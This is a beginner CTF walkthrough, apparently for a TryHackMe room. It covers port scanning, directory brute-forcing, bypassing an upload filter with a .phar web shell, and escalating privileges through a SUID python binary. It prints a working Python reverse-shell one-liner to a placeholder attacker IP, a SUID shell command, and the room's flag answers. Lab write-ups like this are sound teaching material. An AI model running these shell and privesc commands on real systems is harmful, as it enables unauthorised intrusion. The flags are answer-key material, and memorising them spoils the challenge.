
A ctf for beginners, can you root me?

# Questions

## Q1: Scan the machine, how many ports are open?
### A: 2

With a simple nmap scan we can get the ports `nmap -A -vv 10.66.180.138`

![](../Img/Pasted%20image%2020260314155234.png)

---
## Q2: What version of Apache is running?
### A: 2.4.41

In the above screenshot we can see the version.

---
## Q3: What service is running on port 22?
### A: ssh

It's in Q1 screenshot

---
## Q4: Find directories on the web server using the GoBuster tool.
### A: -

I just used gobuster to search `gobuster dir -u http://10.66.180.138/ -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt`

![](../Img/Pasted%20image%2020260314160850.png)

---
## Q5: What is the hidden directory?
### A: /panel/

The scan hasn't finished yet, but i was checking the directories as they appear

---
## Q6: Find a form to upload and get a reverse shell, and find the flag.  Search for user.txt
### A: THM{y0u_g0t_a_sh3ll}

First i tried to upload a simple .php file and couldn't

![](../Img/Pasted%20image%2020260314170455.png)

So i tried to bypass whatever filter it had in place (i didn't see anything weir in the request or in the hmtl code) 

For that i used burpsuite intruder

![](../Img/Pasted%20image%2020260314170621.png)

A couple of the first extentions didn't work but after php3 all worked (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)

So i tried with a couple until one worked (.phar)

![](../Img/Pasted%20image%2020260314170814.png)

With that we need to search for the file

It took a little but i found the file, it's in "/var/www/user.txt"

![](../Img/Pasted%20image%2020260314171323.png)

---
## Q7: Search for files with SUID permission, which file is weird?
### A: /usr/bin/python

With that out of the way we nee to do this search: `find / -user root -perm /4000`

![](../Img/Pasted%20image%2020260314171656.png)

I used this `find / -user root -perm /4000 2>/dev/null | sed 's/$/<br>/'` to format ir bc i'm not reading that

![](../Img/Pasted%20image%2020260314172718.png)

Read through them and find the answer

---
## Q8: Find a form to escalate your privileges.
### A: 

For this one i use gtfobins (https://gtfobins.org/#//^suid$)

With the python privesc methon i ended up using this command `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'` and the ip addres that it's in (https://tryhackme.com/manage-account/access) under openvpn as my ip

![](../Img/Pasted%20image%2020260314174141.png)

After that i used `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` for privesc

![](../Img/Pasted%20image%2020260314174156.png)

---
## Q9: root.txt 
### A: THM{pr1v1l3g3_3sc4l4t10n}

Search for it

![](../Img/Pasted%20image%2020260314174347.png)


Tags: 